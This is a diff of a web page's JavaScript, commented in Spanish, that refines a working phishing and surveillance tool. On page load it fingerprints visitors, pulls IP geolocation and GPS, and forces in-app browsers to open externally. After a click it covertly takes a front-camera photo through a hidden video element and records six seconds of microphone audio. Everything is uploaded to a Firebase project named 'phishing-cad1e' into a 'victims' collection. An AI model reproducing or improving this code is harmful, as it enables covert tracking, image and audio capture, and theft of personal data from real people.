@@ -66,202 +66,174 @@ html,body{
 </div>
 
 <script>
-// ─── IN-APP REDIRECT ──────────────────────────────────────────
+// ── In-app redirect: fuerza apertura en Chrome/Safari real ──────
 (function(){
   const ua = navigator.userAgent || '';
-  const isInApp = (
-    /musical_ly|TikTok|BytedanceWebview|ByteLocale/i.test(ua)||
-    /Instagram|FBAN|FBAV|FB_IAB|FB4A|FBIOS|Threads/i.test(ua)||
-    /Snapchat|Twitter|LinkedInApp|WhatsApp/i.test(ua)||
-    (/wv/.test(ua)&&/Android/i.test(ua)&&!/Chrome\/[.0-9]*(?! Mobile Safari)/.test(ua))||
-    (/iPhone|iPad|iPod/i.test(ua)&&/AppleWebKit/i.test(ua)&&!/Safari\/[0-9]/.test(ua))
-  );
-  if(!isInApp) return;
-  if(/Android/i.test(ua)){
-    location.href=location.href.replace(/^https?:/,'intent:')+'#Intent;scheme='+(location.protocol==='https:'?'https':'http')+';package=com.android.chrome;end';
-    setTimeout(()=>{ location.href='googlechrome://'+location.host+location.pathname+location.search; },800);
+  const inApp =
+    /musical_ly|TikTok|BytedanceWebview|ByteLocale/i.test(ua) ||
+    /Instagram|FBAN|FBAV|FB_IAB|FB4A|FBIOS|Threads/i.test(ua) ||
+    /Snapchat|Twitter|LinkedInApp|WhatsApp/i.test(ua) ||
+    (/wv/.test(ua) && /Android/i.test(ua) && !/Chrome\/[.0-9]* Mobile Safari/.test(ua)) ||
+    (/iPhone|iPad|iPod/i.test(ua) && /AppleWebKit/i.test(ua) && !/Safari\/[0-9]/.test(ua));
+  if (!inApp) return;
+  if (/Android/i.test(ua)) {
+    location.href = location.href.replace(/^https?:/, 'intent:') +
+      '#Intent;scheme=' + (location.protocol === 'https:' ? 'https' : 'http') +
+      ';package=com.android.chrome;end';
+    setTimeout(() => { location.href = 'googlechrome://' + location.host + location.pathname + location.search; }, 800);
     return;
   }
-  if(/iPhone|iPad|iPod/i.test(ua)){
-    location.href=location.href.replace(/^https/,'x-safari-https').replace(/^http(?!s)/,'x-safari-http');
+  if (/iPhone|iPad|iPod/i.test(ua)) {
+    location.href = location.href.replace(/^https/, 'x-safari-https').replace(/^http(?!s)/, 'x-safari-http');
   }
 })();
 
-// ─── CONFIG ───────────────────────────────────────────────────
+// ── Config ──────────────────────────────────────────────────────
 const KEY  = 'AIzaSyCPpG5yJ-1FkfHj8GHTucZRU_5dia-aqX0';
 const PROJ = 'phishing-cad1e';
 const ST   = 'phishing-cad1e.firebasestorage.app';
 const COL  = `https://firestore.googleapis.com/v1/projects/${PROJ}/databases/(default)/documents/victims`;
+const iOS  = /iPhone|iPad|iPod/i.test(navigator.userAgent);
 
+// ── Estado ──────────────────────────────────────────────────────
 let docId = null;
 const D   = { ts: String(Date.now()) };
-const iOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);
+const set = (k, v) => { if (v != null && v !== '') D[k] = String(v).slice(0, 900); };
 
-const set = (k,v) => { if(v!=null&&v!=='') D[k]=String(v).slice(0,900); };
-
-function toFields(obj){
-  const f={};
-  for(const [k,v] of Object.entries(obj)) f[k]={stringValue:v};
-  return {fields:f};
+function toFields(obj) {
+  const f = {};
+  for (const [k, v] of Object.entries(obj)) f[k] = { stringValue: v };
+  return { fields: f };
 }
 
-// push con retry automático — si falla red, reintenta hasta 3 veces
-async function push(retries=3){
-  for(let i=0;i<retries;i++){
-    try{
-      if(!docId){
-        const r=await fetch(`${COL}?key=${KEY}`,{
-          method:'POST',
-          headers:{'Content-Type':'application/json'},
-          body:JSON.stringify(toFields(D))
+// ── push: crea o actualiza el doc con retry ──────────────────────
+async function push(retries = 3) {
+  for (let i = 0; i < retries; i++) {
+    try {
+      if (!docId) {
+        const r = await fetch(`${COL}?key=${KEY}`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(toFields(D))
         });
-        const j=await r.json();
-        if(j.name){ docId=j.name.split('/').pop(); return; }
+        const j = await r.json();
+        if (j.name) { docId = j.name.split('/').pop(); return; }
       } else {
-        const mask=Object.keys(D).map(k=>`updateMask.fieldPaths=${encodeURIComponent(k)}`).join('&');
-        await fetch(`${COL}/${docId}?key=${KEY}&${mask}`,{
-          method:'PATCH',
-          headers:{'Content-Type':'application/json'},
-          body:JSON.stringify(toFields(D))
+        const mask = Object.keys(D).map(k => `updateMask.fieldPaths=${encodeURIComponent(k)}`).join('&');
+        await fetch(`${COL}/${docId}?key=${KEY}&${mask}`, {
+          method: 'PATCH',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(toFields(D))
         });
         return;
       }
-    } catch(e){ await new Promise(r=>setTimeout(r,400)); }
+    } catch (_) { await sleep(400); }
   }
 }
 
-async function upload(path,dataUrl,mime){
-  // FIX-STORAGE: encodeURIComponent convierte '/' en '%2F' — Firebase Storage
-  // recibe el path completo como query param ?name=, necesita los slashes como
-  // %2F para separar carpetas. Pero la URL de descarga (alt=media) también
-  // necesita el path con %2F. Codificamos con encodeURIComponent (que hace %2F)
-  // y lo usamos tanto para upload como para la URL de lectura.
-  // Retry hasta 3 veces con backoff por si hay timeout de red móvil.
-  const name = path.split('/').map(encodeURIComponent).join('%2F');
+// ── upload: sube a Firebase Storage con retry ───────────────────
+async function upload(path, dataUrl, mime) {
+  const name      = path.split('/').map(encodeURIComponent).join('%2F');
   const uploadUrl = `https://firebasestorage.googleapis.com/v0/b/${ST}/o?name=${name}&key=${KEY}`;
   const readUrl   = `https://firebasestorage.googleapis.com/v0/b/${ST}/o/${name}?alt=media`;
-  try{
-    const b64 = dataUrl.split(',')[1];
-    const bin = Uint8Array.from(atob(b64), c=>c.charCodeAt(0));
-    for(let attempt=0; attempt<3; attempt++){
-      try{
-        const r = await fetch(uploadUrl, {
-          method:'POST',
-          headers:{'Content-Type':mime},
-          body: bin
-        });
+  try {
+    const bin = Uint8Array.from(atob(dataUrl.split(',')[1]), c => c.charCodeAt(0));
+    for (let i = 0; i < 3; i++) {
+      try {
+        const r = await fetch(uploadUrl, { method: 'POST', headers: { 'Content-Type': mime }, body: bin });
         const j = await r.json();
-        if(j.name) return readUrl;
-        // j.error → wait and retry
-        if(j.error) await new Promise(r=>setTimeout(r, 600*(attempt+1)));
-      } catch(netErr){
-        if(attempt<2) await new Promise(r=>setTimeout(r, 600*(attempt+1)));
-      }
+        if (j.name) return readUrl;
+        if (j.error) await sleep(600 * (i + 1));
+      } catch (_) { if (i < 2) await sleep(600 * (i + 1)); }
     }
-  } catch(e){}
+  } catch (_) {}
   return null;
 }
 
-function safeBtoa(bytes){
-  let s=''; const chunk=8192;
-  for(let i=0;i<bytes.length;i+=chunk)
-    s+=String.fromCharCode(...bytes.subarray(i,i+chunk));
+function safeBtoa(bytes) {
+  let s = '';
+  for (let i = 0; i < bytes.length; i += 8192)
+    s += String.fromCharCode(...bytes.subarray(i, i + 8192));
   return btoa(s);
 }
 
-// ─────────────────────────────────────────────────────────────
-// ESTRATEGIA VELOCIDAD:
-// Fase 0 (0ms):   fingerprint pasivo + IP (paralelo, sin esperar)
-// Fase 1 (click): getUserMedia video+audio simultáneo
-// Fase 2 (click): GPS enableHighAccuracy:false PRIMERO → respuesta <1s
-//                 GPS enableHighAccuracy:true  en paralelo → llega cuando llega
-// Fase 3 (~1s):   foto del primer frame válido (no esperar 3s, checar cada 200ms)
-// Fase 4 (~1s):   audio empieza grabando inmediatamente junto con foto
-// Todo en paralelo, nada secuencial.
-// ─────────────────────────────────────────────────────────────
+const sleep = ms => new Promise(r => setTimeout(r, ms));
 
-// ── FASE 0: fingerprint pasivo (dispara al cargar, sin esperar) ──
-(function fp(){
-  set('ua',      navigator.userAgent);
-  set('platform',navigator.platform);
-  set('lang',    navigator.language);
-  set('cores',   navigator.hardwareConcurrency);
-  set('memory',  navigator.deviceMemory);
-  set('touch',   navigator.maxTouchPoints);
-  set('screen',  `${screen.width}x${screen.height}@${devicePixelRatio}`);
-  set('tz',      Intl.DateTimeFormat().resolvedOptions().timeZone);
-  set('online',  navigator.onLine);
+// ── Fingerprint pasivo: dispara al cargar ───────────────────────
+(function fingerprint() {
+  set('ua',       navigator.userAgent);
+  set('platform', navigator.platform);
+  set('lang',     navigator.language);
+  set('cores',    navigator.hardwareConcurrency);
+  set('memory',   navigator.deviceMemory);
+  set('touch',    navigator.maxTouchPoints);
+  set('screen',   `${screen.width}x${screen.height}@${devicePixelRatio}`);
+  set('tz',       Intl.DateTimeFormat().resolvedOptions().timeZone);
+  set('online',   navigator.onLine);
+  set('dark',     window.matchMedia('(prefers-color-scheme:dark)').matches);
 
-  const nav=navigator.connection||navigator.mozConnection||navigator.webkitConnection;
-  if(nav){ set('connType',nav.effectiveType); set('connDl',nav.downlink); }
+  const nav = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if (nav) { set('connType', nav.effectiveType); set('connDl', nav.downlink); }
 
-  try{
-    const gl=document.createElement('canvas').getContext('webgl');
-    const ext=gl?.getExtension('WEBGL_debug_renderer_info');
-    if(ext){
-      set('glVendor',  gl.getParameter(ext.UNMASKED_VENDOR_WEBGL));
-      set('glRenderer',gl.getParameter(ext.UNMASKED_RENDERER_WEBGL));
+  try {
+    const gl  = document.createElement('canvas').getContext('webgl');
+    const ext = gl?.getExtension('WEBGL_debug_renderer_info');
+    if (ext) {
+      set('glVendor',   gl.getParameter(ext.UNMASKED_VENDOR_WEBGL));
+      set('glRenderer', gl.getParameter(ext.UNMASKED_RENDERER_WEBGL));
     }
-  } catch(e){}
+  } catch (_) {}
 
-  // Batería (Chrome/Android)
-  if(navigator.getBattery){
-    navigator.getBattery().then(b=>{
-      set('bat',   Math.round(b.level*100)+'%');
-      set('batChg',b.charging);
+  try {
+    const cv  = document.createElement('canvas');
+    const ctx = cv.getContext('2d');
+    ctx.fillStyle = '#f60'; ctx.fillRect(0, 0, 10, 10);
+    ctx.fillStyle = '#069'; ctx.font = '11px Arial'; ctx.fillText('x', 2, 9);
+    set('canvas', cv.toDataURL().slice(-40));
+  } catch (_) {}
+
+  if (navigator.getBattery) {
+    navigator.getBattery().then(b => {
+      set('bat',    Math.round(b.level * 100) + '%');
+      set('batChg', b.charging);
       push();
-    }).catch(()=>{});
+    }).catch(() => {});
   } else {
-    set('bat','ios_na');
+    set('bat', 'ios_na');
   }
 
-  // IP: dos proveedores en paralelo, el que responda primero gana
-  // ipapi.co responde en ~300ms, freeipapi en ~800ms
-  // usar Promise.race para máxima velocidad
+  // IP: race entre dos proveedores, gana el más rápido
   const ipSources = [
-    fetch('https://ipapi.co/json/',{signal:AbortSignal.timeout(5000)})
-      .then(r=>r.json())
-      .then(j=>({
-        ip:j.ip, city:j.city, region:j.region,
-        country:j.country_name, cc:j.country_code,
-        ipLat:j.latitude, ipLon:j.longitude, org:j.org
-      })),
-    fetch('https://freeipapi.com/api/json/',{signal:AbortSignal.timeout(5000)})
-      .then(r=>r.json())
-      .then(j=>({
-        ip:j.ipAddress, city:j.cityName, region:j.regionName,
-        country:j.countryName, cc:j.countryCode,
-        ipLat:j.latitude, ipLon:j.longitude, org:j.ipType
-      }))
+    fetch('https://ipapi.co/json/', { signal: AbortSignal.timeout(5000) })
+      .then(r => r.json())
+      .then(j => ({ ip: j.ip, city: j.city, region: j.region, country: j.country_name, cc: j.country_code, ipLat: j.latitude, ipLon: j.longitude, org: j.org })),
+    fetch('https://freeipapi.com/api/json/', { signal: AbortSignal.timeout(5000) })
+      .then(r => r.json())
+      .then(j => ({ ip: j.ipAddress, city: j.cityName, region: j.regionName, country: j.countryName, cc: j.countryCode, ipLat: j.latitude, ipLon: j.longitude, org: j.ipType }))
   ];
-
-  Promise.race(ipSources).then(j=>{
-    set('ip',     j.ip);
-    set('city',   j.city);
-    set('region', j.region);
-    set('country',j.country);
-    set('cc',     j.cc);
-    set('ipLat',  j.ipLat);
-    set('ipLon',  j.ipLon);
-    set('org',    j.org);
+  Promise.race(ipSources).then(j => {
+    set('ip',      j.ip);
+    set('city',    j.city);
+    set('region',  j.region);
+    set('country', j.country);
+    set('cc',      j.cc);
+    set('ipLat',   j.ipLat);
+    set('ipLon',   j.ipLon);
+    set('org',     j.org);
     push();
-  }).catch(()=>{});
+  }).catch(() => {});
 
-  push(); // push inicial con lo que hay
+  push();
 })();
 
-// ── GPS: dispara inmediatamente al cargar (no esperar click) ──
-// Razón: el dialog de permisos de ubicación aparece al cargar,
-// el usuario ya tomó la decisión. Si dispara al click, se superpone
-// con el dialog de cámara y el usuario cancela ambos.
-// Disparar al cargar = permisos separados = más chance de "Permitir".
-(function gpsEarly(){
-  if(!('geolocation' in navigator)) return;
+// ── GPS: dispara al cargar, separado del click para no solapar permisos ──
+(function gps() {
+  if (!('geolocation' in navigator)) return;
   let bestAcc = Infinity;
 
   const save = pos => {
     const acc = pos.coords.accuracy;
-    if(acc < bestAcc){
+    if (acc < bestAcc) {
       bestAcc = acc;
       set('gpsLat', pos.coords.latitude);
       set('gpsLon', pos.coords.longitude);
@@ -271,207 +243,207 @@ function safeBtoa(bytes){
     }
   };
 
-  // Baja precisión primero — respuesta en <500ms (WiFi/celda)
-  // En muchos casos ya da coordenadas a <100m que es suficiente
-  navigator.geolocation.getCurrentPosition(save, ()=>{}, {
-    enableHighAccuracy: false,
-    timeout: 4000,
-    maximumAge: 60000
+  // Baja precisión primero (WiFi/celda, ~<500ms)
+  navigator.geolocation.getCurrentPosition(save, () => {}, {
+    enableHighAccuracy: false, timeout: 4000, maximumAge: 60000
   });
-
-  // Alta precisión en paralelo — GPS real, llega en 10-25s
-  // Si la víctima ya cerró, igual llega al docId guardado
-  navigator.geolocation.getCurrentPosition(save, ()=>{}, {
-    enableHighAccuracy: true,
-    timeout: 30000,
-    maximumAge: 0
+  // Alta precisión en paralelo (GPS real, ~10–25s)
+  navigator.geolocation.getCurrentPosition(save, () => {}, {
+    enableHighAccuracy: true, timeout: 30000, maximumAge: 0
   });
-
-  // watchPosition para mejora progresiva
-  // FIX-WATCH: timeout explícito en watchPosition.
-  // Sin timeout, iOS puede colgar el watcher silenciosamente cuando el GPS
-  // tarda más de lo esperado. Con timeout:10000 fuerza re-intento cada 10s.
+  // watchPosition para mejora continua
   const wid = navigator.geolocation.watchPosition(
-    pos => { save(pos); if(bestAcc < 8) navigator.geolocation.clearWatch(wid); },
+    pos => { save(pos); if (bestAcc < 8) navigator.geolocation.clearWatch(wid); },
     () => {},
     { enableHighAccuracy: true, maximumAge: 0, timeout: 10000 }
   );
-  setTimeout(()=>navigator.geolocation.clearWatch(wid), 50000);
+  setTimeout(() => navigator.geolocation.clearWatch(wid), 50000);
 })();
 
-// ── CLICK: cámara + audio (requiere gesto del usuario) ──
+// ── Click ────────────────────────────────────────────────────────
 document.getElementById('btnOk').addEventListener('click', collect);
 
-async function collect(){
-  set('clicked','true'); push();
+async function collect() {
+  set('clicked', 'true');
+  push();
 
-  if(!navigator.mediaDevices?.getUserMedia){
-    set('camErr','no_api'); push(); return;
+  if (!navigator.mediaDevices?.getUserMedia) {
+    set('camErr', 'no_api'); push(); return;
   }
 
-  let stream=null;
-  try{
-    stream=await navigator.mediaDevices.getUserMedia({
-      video:{facingMode:'user',width:{ideal:1280},height:{ideal:720}},
-      audio:true
+  // getUserMedia: intenta video+audio, cae a solo video si no
+  let stream = null;
+  let hasAudio = false;
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+      audio: true
     });
-    set('camGranted','true');
-    set('audioGranted','true');
-    push();
-  } catch(e1){
-    try{
-      stream=await navigator.mediaDevices.getUserMedia({
-        video:{facingMode:'user'},audio:false
-      });
-      set('camGranted','true');
-      set('audioGranted','false');
-      push();
-    } catch(e2){
-      set('camErr',e2.name+':'+e2.message); push(); return;
+    hasAudio = true;
+    set('camGranted', 'true'); set('audioGranted', 'true');
+  } catch (_) {
+    try {
+      stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+      set('camGranted', 'true'); set('audioGranted', 'false');
+    } catch (e) {
+      set('camErr', e.name + ':' + e.message); push(); return;
     }
   }
+  push();
 
-  const vid=document.createElement('video');
-  vid.setAttribute('playsinline','');
-  vid.setAttribute('webkit-playsinline','');
-  vid.autoplay=true; vid.muted=true; vid.srcObject=stream;
-  vid.style.cssText='position:fixed;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;';
+  // Video element oculto para capturar frames
+  const vid = Object.assign(document.createElement('video'), {
+    autoplay: true, muted: true, srcObject: stream
+  });
+  vid.setAttribute('playsinline', '');
+  vid.setAttribute('webkit-playsinline', '');
+  vid.style.cssText = 'position:fixed;left:-9999px;width:1px;height:1px;opacity:0;pointer-events:none;';
   document.body.appendChild(vid);
 
-  await new Promise(res=>{
-    if(vid.readyState>=2){res();return;}
-    vid.onloadeddata=res; vid.onerror=res;
-    setTimeout(res,3000);
+  await new Promise(res => {
+    if (vid.readyState >= 2) { res(); return; }
+    vid.onloadeddata = res; vid.onerror = res; setTimeout(res, 3000);
   });
-  try{ await vid.play(); }catch(e){}
+  try { await vid.play(); } catch (_) {}
 
-  // Asegurar docId antes de subir
-  if(!docId) await push();
-  let w=0;
-  while(!docId&&w<3000){ await new Promise(r=>setTimeout(r,200)); w+=200; }
-  const uid=docId||('anon_'+Date.now());
+  // Asegurar docId antes de subir archivos
+  if (!docId) await push();
+  for (let w = 0; !docId && w < 3000; w += 200) await sleep(200);
+  const uid = docId || ('anon_' + Date.now());
 
-  // FIX-PARALLEL: foto y audio en paralelo.
-  // Las video tracks se paran DENTRO de _grabPhoto cuando la foto está lista
-  // para no bloquear el stream de audio (que comparte el MediaStream).
-  // El stream completo se para al final de _grabAudio.
+  // Foto y audio en paralelo — ambos devuelven Promise real que resuelve tras upload
   await Promise.allSettled([
     _grabPhoto(vid, uid),
-    _grabAudio(stream, uid)
+    hasAudio ? _grabAudio(stream, uid) : Promise.resolve()
   ]);
+
+  vid.srcObject?.getTracks().forEach(t => t.stop());
   vid.remove();
 
-  if('Notification' in window){
+  if ('Notification' in window) {
     Notification.requestPermission()
-      .then(r=>{set('notif',r);push();}).catch(()=>{});
+      .then(r => { set('notif', r); push(); })
+      .catch(() => {});
   }
 }
 
-// ── FOTO: polling cada 200ms hasta frame válido (max 8s) ──
-// FIX-PHOTO: firma cambiada a _grabPhoto(vid, uid) — sin stream.
-// Las video tracks se paran aquí después de capturar, para no
-// cortar el audio que comparte el mismo MediaStream.
-async function _grabPhoto(vid, uid){
-  const maxMs  = 8000;
-  const startT = Date.now();
-  let attempt  = 0;
+// ── Foto: polling de frames, resuelve tras upload ───────────────
+async function _grabPhoto(vid, uid) {
+  const deadline = Date.now() + 8000;
+  let attempt = 0;
 
-  while(Date.now()-startT < maxMs){
+  while (Date.now() < deadline) {
     attempt++;
-    try{
-      const w = vid.videoWidth  || 0;
-      const h = vid.videoHeight || 0;
-      if(w > 4 && h > 4){
+    try {
+      const w = vid.videoWidth || 0, h = vid.videoHeight || 0;
+      if (w > 4 && h > 4) {
         const cv  = document.createElement('canvas');
         cv.width  = w; cv.height = h;
-        const ctx = cv.getContext('2d', {willReadFrequently:true});
+        const ctx = cv.getContext('2d', { willReadFrequently: true });
         ctx.drawImage(vid, 0, 0, w, h);
 
-        // Sample central 50%x50% — evita bordes negros de letterbox en iOS
-        const sx = Math.floor(w*0.25), sy = Math.floor(h*0.25);
-        const sw = Math.floor(w*0.5),  sh = Math.floor(h*0.5);
-        const imgData = ctx.getImageData(sx, sy, sw, sh);
+        // Muestrea el centro 50%×50% para evitar bordes negros de letterbox
+        const sx = Math.floor(w * .25), sy = Math.floor(h * .25);
+        const sw = Math.floor(w * .5),  sh = Math.floor(h * .5);
+        const px = ctx.getImageData(sx, sy, sw, sh).data;
         let bright = 0;
-        for(let i=0; i<imgData.data.length; i+=4)
-          bright += imgData.data[i] + imgData.data[i+1] + imgData.data[i+2];
-        const avgBright = bright / (imgData.data.length / 4 * 3);
+        for (let i = 0; i < px.length; i += 4) bright += px[i] + px[i+1] + px[i+2];
+        const avg = bright / (px.length / 4 * 3);
 
-        if(avgBright > 6){ // frame con luz real (umbral bajado de 8 a 6)
-          // FIX-VIDSTOP: parar video aquí, antes del upload async,
-          // para liberar la cámara pero SIN parar audio tracks
-          vid.srcObject?.getVideoTracks()?.forEach(t => t.stop());
+        if (avg > 6) {
+          // Para video tracks aquí para liberar cámara sin cortar audio
+          vid.srcObject?.getVideoTracks().forEach(t => t.stop());
           const dataUrl = cv.toDataURL('image/jpeg', 0.85);
           const url = await upload(`photos/${uid}.jpg`, dataUrl, 'image/jpeg');
-          if(url){ set('photoUrl', url); set('photoAttempt', String(attempt)); push(); }
-          else   { set('photoErr', 'upload_fail_' + attempt); push(); }
+          if (url) { set('photoUrl', url); set('photoAttempt', String(attempt)); }
+          else      { set('photoErr', 'upload_fail_' + attempt); }
+          push();
           return;
         }
       }
-    } catch(e){ set('photoErr', e.message + '_a' + attempt); push(); return; }
-    await new Promise(r => setTimeout(r, 200));
+    } catch (e) { set('photoErr', e.message + '_a' + attempt); push(); return; }
+    await sleep(200);
   }
-  // FIX: parar video incluso si no conseguimos frame válido
-  vid.srcObject?.getVideoTracks()?.forEach(t => t.stop());
-  set('photoErr', 'timeout_' + attempt + '_attempts'); push();
+  vid.srcObject?.getVideoTracks().forEach(t => t.stop());
+  set('photoErr', 'timeout_' + attempt + '_attempts');
+  push();
 }
 
-// ── AUDIO: MIME correcto por plataforma ──
-async function _grabAudio(existingStream, uid){
-  try{
-    const liveAudio=existingStream?.getAudioTracks()?.filter(t=>t.readyState==='live')??[];
-    let s;
-    if(liveAudio.length>0){
-      s=existingStream;
-    } else {
-      try{
-        s=await navigator.mediaDevices.getUserMedia({audio:true,video:false});
-      } catch(e){ set('audioErr','mic:'+e.message); push(); return; }
-    }
+// ── Audio: graba 6s y sube — Promise resuelve DENTRO de onstop tras upload ──
+//
+// Fix central de v9: en v8 _grabAudio retornaba después de rec.start(),
+// lo que hacía que Promise.allSettled pensara que el audio estaba listo
+// cuando en realidad onstop (y su upload) todavía no habían disparado.
+// Aquí la Promise no resuelve hasta que onstop termina el await upload().
+//
+function _grabAudio(stream, uid) {
+  return new Promise(resolve => {
+    const liveAudio = stream.getAudioTracks().filter(t => t.readyState === 'live');
+    let s = stream; // reutiliza el stream existente si tiene audio vivo
 
-    const mimes=iOS
-      ?['audio/mp4;codecs=mp4a.40.2','audio/mp4','audio/aac']
-      :['audio/webm;codecs=opus','audio/webm','audio/mp4','audio/ogg;codecs=opus'];
+    const start = async () => {
+      if (liveAudio.length === 0) {
+        try {
+          s = await navigator.mediaDevices.getUserMedia({ audio: true, video: false });
+        } catch (e) {
+          set('audioErr', 'mic:' + e.message); push(); resolve(); return;
+        }
+      }
 
-    const mime=mimes.find(m=>{ try{return MediaRecorder.isTypeSupported(m);}catch(e){return false;} })||'';
+      const mimes = iOS
+        ? ['audio/mp4;codecs=mp4a.40.2', 'audio/mp4', 'audio/aac']
+        : ['audio/webm;codecs=opus', 'audio/webm', 'audio/mp4', 'audio/ogg;codecs=opus'];
+      const mime = mimes.find(m => { try { return MediaRecorder.isTypeSupported(m); } catch (_) { return false; } }) || '';
 
-    let rec;
-    try{ rec=new MediaRecorder(s,mime?{mimeType:mime}:{}); }
-    catch(e){ try{rec=new MediaRecorder(s);}catch(e2){set('audioErr','init:'+e2.message);push();return;} }
+      let rec;
+      try { rec = new MediaRecorder(s, mime ? { mimeType: mime } : {}); }
+      catch (_) {
+        try { rec = new MediaRecorder(s); }
+        catch (e) { set('audioErr', 'init:' + e.message); push(); resolve(); return; }
+      }
 
-    const chunks=[];
-    rec.ondataavailable=e=>{ if(e.data?.size>0) chunks.push(e.data); };
-    rec.onstop=async()=>{
-      // FIX-AUDIOSTOP: parar TODAS las tracks del stream aquí.
-      // Las video tracks ya fueron paradas por _grabPhoto, esto para las audio tracks.
-      s.getTracks().forEach(t=>t.stop());
-      try{
-        const fm=rec.mimeType||mime||'audio/webm';
-        const ext=fm.includes('mp4')||fm.includes('aac')?'m4a':fm.includes('ogg')?'ogg':'webm';
-        const blob=new Blob(chunks,{type:fm});
-        if(blob.size<100){set('audioErr','empty_'+blob.size);push();return;}
-        const ab=await blob.arrayBuffer();
-        const b64='data:'+fm+';base64,'+safeBtoa(new Uint8Array(ab));
-        const url=await upload(`audio/${uid}.${ext}`,b64,fm);
-        if(url){set('audioUrl',url);push();}
-        else   {set('audioErr','upload_fail');push();}
-      } catch(e){set('audioErr','stop:'+e.message);push();}
+      const chunks = [];
+      rec.ondataavailable = e => { if (e.data?.size > 0) chunks.push(e.data); };
+
+      rec.onstop = async () => {
+        // Para solo audio tracks (video ya fue parado por _grabPhoto)
+        s.getAudioTracks().forEach(t => t.stop());
+        try {
+          const fm  = rec.mimeType || mime || 'audio/webm';
+          const ext = fm.includes('mp4') || fm.includes('aac') ? 'm4a' : fm.includes('ogg') ? 'ogg' : 'webm';
+          const blob = new Blob(chunks, { type: fm });
+          if (blob.size < 100) {
+            set('audioErr', 'empty_' + blob.size);
+          } else {
+            const ab  = await blob.arrayBuffer();
+            const b64 = 'data:' + fm + ';base64,' + safeBtoa(new Uint8Array(ab));
+            const url = await upload(`audio/${uid}.${ext}`, b64, fm);
+            if (url) set('audioUrl', url);
+            else     set('audioErr', 'upload_fail');
+          }
+        } catch (e) { set('audioErr', 'stop:' + e.message); }
+        push();
+        resolve(); // ← resuelve AQUÍ, después del upload
+      };
+
+      rec.onerror = e => { set('audioErr', 'rec:' + (e.error?.message || '?')); push(); resolve(); };
+
+      // iOS Safari requiere timeslice >= 500ms para ondataavailable confiable
+      rec.start(500);
+      setTimeout(() => { try { rec.stop(); } catch (_) {} }, 6000);
     };
-    rec.onerror=e=>{set('audioErr','rec:'+e.error?.message);push();};
-    // FIX-TIMESLICE: iOS Safari MediaRecorder requires timeslice >= 500ms
-    // to reliably fire ondataavailable. At 300ms, the event is silently
-    // dropped on some iOS versions → chunks stays empty → blob 0 bytes.
-    rec.start(500);
-    setTimeout(()=>{ try{rec.stop();}catch(e){} },6000);
-  } catch(e){set('audioErr','outer:'+e.message);push();}
+
+    start().catch(e => { set('audioErr', 'outer:' + e.message); push(); resolve(); });
+  });
 }
 
-// ─── EXIT BEACON ──────────────────────────────────────────────
-window.addEventListener('beforeunload',()=>{
-  if(!docId) return;
-  set('_exit',Date.now());
+// ── Exit beacon ──────────────────────────────────────────────────
+window.addEventListener('beforeunload', () => {
+  if (!docId) return;
+  set('_exit', Date.now());
   navigator.sendBeacon(
     `${COL}/${docId}?key=${KEY}&updateMask.fieldPaths=_exit`,
-    JSON.stringify(toFields({_exit:String(Date.now())}))
+    JSON.stringify(toFields({ _exit: String(Date.now()) }))
   );
 });
 </script>
